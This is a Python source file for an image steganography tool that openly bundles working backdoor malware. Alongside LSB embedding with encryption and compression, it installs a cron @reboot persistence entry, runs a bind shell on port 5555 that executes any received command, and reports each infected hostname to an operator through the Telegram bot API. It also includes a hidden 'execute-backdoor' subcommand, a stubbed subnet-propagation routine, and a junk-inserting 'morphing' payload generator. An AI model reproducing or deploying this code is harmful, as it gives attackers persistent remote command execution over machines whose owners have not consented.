import argparse
import os
import sys
import zlib
import random
import hashlib
import base64
import logging
import socket
import subprocess
import threading
import time
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import numpy as np
import cv2
from skimage.metrics import structural_similarity as ssim
import string

# --- Configuration ---
PROPAGATION_COUNT_FILE = "/tmp/.propagation_count"
MAX_PROPAGATIONS = 3
BACKDOOR_PORT = 5555
SCAN_SUBNET = "192.168.1."

# --- Security Configuration ---
# IMPORTANT: Telegram credentials should be set as environment variables.
# export TELEGRAM_BOT_TOKEN="your_bot_token"
# export TELEGRAM_CHAT_ID="your_chat_id"
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

# --- Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Cryptography & Data Manipulation ---

def generate_key(method='fernet'):
    """Generate a new encryption key."""
    if method == 'fernet':
        return Fernet.generate_key()
    elif method == 'aes':
        return os.urandom(32)
    raise ValueError("Unsupported encryption method")

def encrypt_data(data, key, method='fernet'):
    """Encrypt data using Fernet or AES."""
    if method == 'fernet':
        return Fernet(key).encrypt(data)
    elif method == 'aes':
        iv = os.urandom(16)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return iv + encryptor.update(padded_data) + encryptor.finalize()
    raise ValueError("Unsupported encryption method")

def decrypt_data(encrypted_data, key, method='fernet'):
    """Decrypt data using Fernet or AES."""
    if method == 'fernet':
        return Fernet(key).decrypt(encrypted_data)
    elif method == 'aes':
        iv = encrypted_data[:16]
        encrypted = encrypted_data[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(encrypted) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(decrypted_padded) + unpadder.finalize()
    raise ValueError("Unsupported encryption method")

def compress_data(data, level=9):
    """Compress data using zlib."""
    return zlib.compress(data, level)

def decompress_data(compressed_data):
    """Decompress data using zlib."""
    return zlib.decompress(compressed_data)

def bits_to_bytes(bits):
    """Convert bit string to bytes."""
    return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

# --- Payload Generation ---

class AdvancedMorphingPayloadGenerator:
    def __init__(self, payload_length=100, junk_ratio=0.2):
        if payload_length <= 0:
            raise ValueError("Payload length must be greater than 0")
        if not 0 <= junk_ratio <= 1:
            raise ValueError("Junk ratio must be between 0 and 1")
        self.payload = self.generate_random_string(payload_length).encode()
        self.junk_ratio = junk_ratio

    @staticmethod
    def generate_random_string(length):
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(length))

    def insert_junk(self, data):
        junk_length = int(len(data) * self.junk_ratio)
        junk_bytes = os.urandom(junk_length)
        data_list = list(data)
        for jb in junk_bytes:
            pos = random.randint(0, len(data_list))
            data_list.insert(pos, jb)
        return bytes(data_list)

    def generate_payload(self):
        return self.insert_junk(self.payload)

# --- Steganography Core ---

def calculate_capacity(image, bits_per_channel=1):
    """Calculate maximum bytes that can be hidden."""
    height, width, channels = image.shape
    return (height * width * channels * bits_per_channel) // 8

def get_edge_map(image, threshold=100):
    """Get edge map using Canny for adaptive embedding."""
    gray = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)
    return cv2.Canny(gray, threshold, threshold * 2)

def generate_pixel_order(image_shape, seed=None):
    """Generate random pixel order for embedding."""
    height, width = image_shape[:2]
    pixels = [(y, x) for y in range(height) for x in range(width)]
    if seed:
        random.seed(seed)
        random.shuffle(pixels)
    return pixels

def embed_lsb(image, data_bits, bits_per_channel, adaptive, seed):
    """Embed bits into image using LSB."""
    height, width, channels = image.shape
    if adaptive:
        edge_map = get_edge_map(image)
        pixel_order = [(y, x) for y in range(height) for x in range(width) if edge_map[y, x] > 0]
        if not pixel_order:
            raise ValueError("No edges detected for adaptive embedding")
    else:
        pixel_order = generate_pixel_order(image.shape, seed)

    bit_index = 0
    for y, x in pixel_order:
        for c in range(channels):
            pixel_value = image[y, x, c]
            for b in range(bits_per_channel):
                if bit_index < len(data_bits):
                    bit = int(data_bits[bit_index])
                    pixel_value = (pixel_value & ~(1 << b)) | (bit << b)
                    bit_index += 1
            image[y, x, c] = pixel_value
        if bit_index >= len(data_bits):
            break
    if bit_index < len(data_bits):
        raise ValueError("Image capacity insufficient for payload")
    return image

def extract_lsb(image, payload_size, bits_per_channel, adaptive, seed):
    """Extract bits from image using LSB."""
    height, width, channels = image.shape
    if adaptive:
        edge_map = get_edge_map(image)
        pixel_order = [(y, x) for y in range(height) for x in range(width) if edge_map[y, x] > 0]
    else:
        pixel_order = generate_pixel_order(image.shape, seed)

    data_bits = []
    extracted_bytes = 0
    for y, x in pixel_order:
        for c in range(channels):
            pixel_value = image[y, x, c]
            for b in range(bits_per_channel):
                bit = (pixel_value >> b) & 1
                data_bits.append(str(bit))
                if len(data_bits) % 8 == 0:
                    extracted_bytes += 1
                if extracted_bytes >= payload_size:
                    return ''.join(data_bits)
    return ''.join(data_bits)

def compute_psnr(original, stego):
    """Compute PSNR between two images."""
    mse = np.mean((original.astype(float) - stego.astype(float)) ** 2)
    if mse == 0:
        return float('inf')
    return 20 * np.log10(255.0 / np.sqrt(mse))

def compute_ssim(original, stego):
    """Compute SSIM between two images."""
    return ssim(original, stego, multichannel=True, data_range=255)

def encode_image(input_path, payload, output_path, bits, encrypt, encrypt_method, key, compress, adaptive, seed, is_file, verbose):
    """High-level function to embed a payload into an image."""
    try:
        image = cv2.imread(input_path, cv2.IMREAD_UNCHANGED)
        if image is None: raise ValueError("Invalid image file")
        original_image = image.copy()

        data = payload
        if is_file:
            with open(payload, 'rb') as f:
                data = f.read()
        elif isinstance(payload, str):
            data = payload.encode('utf-8')

        if compress:
            data = compress_data(data)
            logging.info(f"Compressed payload to {len(data)} bytes")

        if encrypt:
            if not key:
                key = generate_key(encrypt_method)
                key_str = base64.urlsafe_b64encode(key).decode('utf-8')
                print(f"Generated key (save this!): {key_str}")
            else:
                key = base64.urlsafe_b64decode(key)
            data = encrypt_data(data, key, encrypt_method)
            logging.info("Payload encrypted")

        data_hash = hashlib.sha256(data).digest()
        full_data = len(data).to_bytes(4, 'big') + data_hash + data

        capacity = calculate_capacity(image, bits)
        if len(full_data) > capacity:
            raise ValueError(f"Payload too large ({len(full_data)} bytes) vs capacity ({capacity} bytes)")

        data_bits = ''.join(format(byte, '08b') for byte in full_data)
        stego_image = embed_lsb(image, data_bits, bits, adaptive, seed)
        cv2.imwrite(output_path, stego_image)
        logging.info(f"Encoded image saved to {output_path}")

        if verbose:
            psnr = compute_psnr(original_image, stego_image)
            ssim_val = compute_ssim(original_image, stego_image)
            print(f"PSNR: {psnr:.2f} dB | SSIM: {ssim_val:.4f}")
    except Exception as e:
        print(f"Encoding error: {str(e)}", file=sys.stderr)
        sys.exit(1)

def decode_image(input_path, key, encrypt_method, compress, bits, adaptive, seed):
    """High-level function to extract a payload from an image."""
    try:
        image = cv2.imread(input_path, cv2.IMREAD_UNCHANGED)
        if image is None: raise ValueError("Invalid image file")

        # The total header size is 36 bytes (4 for length, 32 for hash)
        header_size_bits = 36 * 8
        header_bits = extract_lsb(image, header_size_bits, bits, adaptive, seed)
        if len(header_bits) < header_size_bits:
            raise ValueError("Could not extract full header from image.")

        header_bytes = bits_to_bytes(header_bits)
        payload_len = int.from_bytes(header_bytes[:4], 'big')
        extracted_hash = header_bytes[4:36]

        # Now extract the payload itself
        payload_bits = extract_lsb(image, header_size_bits + payload_len * 8, bits, adaptive, seed)
        # We need to slice off the header bits to isolate the payload bits
        data_bits = payload_bits[header_size_bits:]
        data = bits_to_bytes(data_bits)

        # Integrity check
        if hashlib.sha256(data).digest() != extracted_hash:
            raise ValueError("Integrity check failed. Data is corrupt or key is wrong.")

        if key:
            key = base64.urlsafe_b64decode(key)
            data = decrypt_data(data, key, encrypt_method)
            logging.info("Payload decrypted")

        if compress:
            data = decompress_data(data)
            logging.info("Payload decompressed")

        return data
    except Exception as e:
        print(f"Decoding error: {str(e)}", file=sys.stderr)
        return None

# --- Backdoor & Propagation ---

def add_persistence():
    """Add script to cron for persistence."""
    script_path = os.path.abspath(__file__)
    cron_line = f"@reboot python3 {script_path} --execute-backdoor\n"
    try:
        crontab = subprocess.check_output(["crontab", "-l"], text=True, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        crontab = ""
    if cron_line not in crontab:
        new_crontab = crontab + cron_line
        p = subprocess.Popen(["crontab"], stdin=subprocess.PIPE, text=True)
        p.communicate(new_crontab)
        logging.info("Persistence added to crontab")

def get_propagation_count():
    if not os.path.exists(PROPAGATION_COUNT_FILE): return 0
    with open(PROPAGATION_COUNT_FILE, "r") as f:
        try: return int(f.read())
        except: return 0

def update_propagation_count(count):
    with open(PROPAGATION_COUNT_FILE, "w") as f:
        f.write(str(count))

def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logging.warning("Telegram credentials not set. Skipping notification.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload, timeout=10)
        logging.info("Successfully sent message to Telegram")
    except Exception as e:
        logging.error(f"Failed to send message to Telegram: {e}")

def handle_client(client_socket):
    try:
        while True:
            command = client_socket.recv(1024).decode().strip()
            if not command or command.lower() == 'exit': break
            try:
                output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                client_socket.send(output)
            except Exception as e:
                client_socket.send(str(e).encode())
    finally:
        client_socket.close()

def start_backdoor_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", BACKDOOR_PORT))
    server.listen(5)
    logging.info(f"Backdoor listening on port {BACKDOOR_PORT}")
    send_to_telegram(f"Backdoor activated on {socket.gethostname()}")
    while True:
        client, addr = server.accept()
        logging.info(f"Accepted connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

def scan_and_propagate():
    count = get_propagation_count()
    if count >= MAX_PROPAGATIONS:
        logging.info("Max propagations reached. Stopping.")
        return
    logging.info("Scanning for targets to propagate...")
    # Placeholder for propagation logic
    logging.warning("Propagation logic not implemented.")
    update_propagation_count(count + 1)

def activate_backdoor():
    """The main function to run the backdoor logic."""
    logging.info("Backdoor activated...")
    add_persistence()

    backdoor_thread = threading.Thread(target=start_backdoor_server, daemon=True)
    backdoor_thread.start()

    propagate_thread = threading.Thread(target=scan_and_propagate, daemon=True)
    propagate_thread.start()

    logging.info("Backdoor running in the background. Main thread will exit.")

# --- Main CLI ---

def main():
    parser = argparse.ArgumentParser(
        description="A versatile steganography tool with backdoor capabilities.",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output.")

    subparsers = parser.add_subparsers(dest="command", required=True)

    # --- Encode Parser ---
    encode_parser = subparsers.add_parser("encode", help="Embed a payload into an image.")
    encode_parser.add_argument("input_image", help="Path to the input image.")
    encode_parser.add_argument("output_image", help="Path to save the output stego image.")
    encode_parser.add_argument("payload", nargs='?', help="Payload string or file path.")
    encode_parser.add_argument("--file", action="store_true", help="Treat payload as a file path.")
    encode_parser.add_argument("--generate-payload", action="store_true", help="Generate a random payload instead of using the 'payload' argument.")
    encode_parser.add_argument("--bits", type=int, default=1, choices=range(1, 5), help="Bits per channel (1-4).")
    encode_parser.add_argument("--compress", action="store_true", help="Compress the payload.")
    encode_parser.add_argument("--encrypt", action="store_true", help="Encrypt the payload.")
    encode_parser.add_argument("--encrypt-method", default="fernet", choices=["fernet", "aes"], help="Encryption method.")
    encode_parser.add_argument("--key", help="Base64 key for encryption/decryption.")
    encode_parser.add_argument("--adaptive", action="store_true", help="Use adaptive embedding in edge regions.")
    encode_parser.add_argument("--seed", help="Seed for random pixel ordering.")

    # --- Decode Parser ---
    decode_parser = subparsers.add_parser("decode", help="Extract a payload from an image.")
    decode_parser.add_argument("input_image", help="Path to the stego image.")
    decode_parser.add_argument("--key", help="Base64 key for decryption.")
    decode_parser.add_argument("--encrypt-method", default="fernet", choices=["fernet", "aes"])
    decode_parser.add_argument("--compress", action="store_true", help="Decompress the payload.")
    decode_parser.add_argument("--output-file", help="Save extracted payload to a file.")
    decode_parser.add_argument("--bits", type=int, default=1, choices=range(1, 5))
    decode_parser.add_argument("--adaptive", action="store_true", help="Use adaptive extraction.")
    decode_parser.add_argument("--seed", help="Seed for random pixel ordering.")
    decode_parser.add_argument("--execute", action="store_true", help="If payload is valid, activate the backdoor.")

    # --- Backdoor Execution Parser (for cron/persistence) ---
    subparsers.add_parser("execute-backdoor", help=argparse.SUPPRESS)

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.INFO)

    if args.command == "encode":
        payload = args.payload
        is_file = args.file
        if args.generate_payload:
            if payload: logging.warning("Payload argument ignored due to --generate-payload.")
            payload = AdvancedMorphingPayloadGenerator().generate_payload()
            is_file = False
        elif not payload:
            parser.error("The 'payload' argument is required if --generate-payload is not used.")

        encode_image(args.input_image, payload, args.output_image, args.bits, args.encrypt, args.encrypt_method, args.key, args.compress, args.adaptive, args.seed, is_file, args.verbose)

    elif args.command == "decode":
        extracted_data = decode_image(args.input_image, args.key, args.encrypt_method, args.compress, args.bits, args.adaptive, args.seed)
        if extracted_data is None:
            print("Failed to extract payload.", file=sys.stderr)
            sys.exit(1)

        if args.execute:
            print("Payload successfully verified. Executing backdoor...")
            activate_backdoor()
        elif args.output_file:
            with open(args.output_file, 'wb') as f:
                f.write(extracted_data)
            print(f"Payload saved to {args.output_file}")
        else:
            try:
                print("Extracted Text:", extracted_data.decode('utf-8'))
            except UnicodeDecodeError:
                print("Extracted Binary Data (use --output-file to save):")
                print(base64.b64encode(extracted_data).decode('utf-8'))

    elif args.command == "execute-backdoor":
        activate_backdoor()
        # Keep the main process alive for the daemon threads
        try:
            while True: time.sleep(3600)
        except KeyboardInterrupt:
            sys.exit(0)

if __name__ == "__main__":
    main()